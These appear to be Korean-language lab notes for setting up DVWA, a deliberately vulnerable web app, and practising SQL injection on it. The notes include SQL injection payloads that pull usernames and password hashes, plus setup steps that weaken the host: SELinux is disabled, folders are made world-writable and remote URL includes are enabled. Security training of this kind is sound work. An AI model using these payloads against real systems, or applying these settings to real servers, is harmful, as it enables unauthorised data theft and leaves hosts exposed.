*웹 취약점 사이트 LAB

- Install set 명령어
```bash
sudo dnf install -y httpd mariadb-server git php php-mysqlnd php-gd php-cli php-json

sudo systemctl enable --now httpd mariadb

cd /var/www/html
git clone https://github.com/digininja/dvwa.git dvwa

```

- 설정 파일과 데이터베이스 세팅
```bash
cd /var/www/html/dvwa/config
cp config.inc.php.dist config.inc.php

vi config.inc.php
```

![](../Images/Pasted%20image%2020260730122400.png)

- 세팅 계정 확인 : dvwa / p@ssw0rd


##### dvma 데이터베이스 생성

```bash
mysql -u root -p
```

```mysql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost'
FLUSH PRIVILEGES;
```

```bash
vi /etc/php.ini

// 아래 값 저장.
> allow_url_fopen = On
> allow_url_include = On
 
chown -R apache:apache /var/www/html/dvwa 
chmod -R 777 /var/www/html/dvwa/hackable/uploads
chmod -R 777 /var/www/html/dvwa/config


// 방화벽 해제.
firewall-cmd --add-service=http --permanent
firewall-cmd --reload

// Selinux 해제
setenforce 0

vi /etc/selinux/config 
> SELINUX=permissive

// 웹 서버 재시작.
sudo systemctl restart httpd

```


---


### DVWA Web 접속

```txt
192.168.63.134/dvwa
	// 계정 id / passwd admin / password
```

**Source Code**

![](../Images/Pasted%20image%2020260730144735.png)

1. `기본 공격
```mysql
' or 2=2--
```
![](../Images/Pasted%20image%2020260730144804.png)

2. UNION
```mysql
1' UNION SELECT user,password from users#
```
![](../Images/Pasted%20image%2020260730144930.png)



2. `UNION DB 탈취
```mysql
1' UNION SELECT database(), version()#
```

![](../Images/Pasted%20image%2020260730145020.png)




**Medium

```php
mysqli_real_escape_string 
// 사용자 입력 값 중 ', \' 등 특수 문자 중 일부 값만 제한
// \ -> \; -> \\'
```

다시 공격.
```mysql
0 or 1=1
```

![](../Images/Pasted%20image%2020260730151807.png)

```mysql
0 UNION SELECT user, password FROM users
```

![](../Images/Pasted%20image%2020260730152358.png)























---

### 에러 조치 모음


**DVMA 설치 안될 경우**

```bash 
systemctl disable httpd systemctl stop httpd sudo dnf install -y podman podman run --rm -it -p 80:80 docker.io/vulnerables/web-dvwa
```

**windows11 환경**
- 스마트 앱 컨트롤을 꺼야한다. windows10 환경에서는 제공되는 기능이 아니기 때문에 별도의 조치가 필요하지는 않다.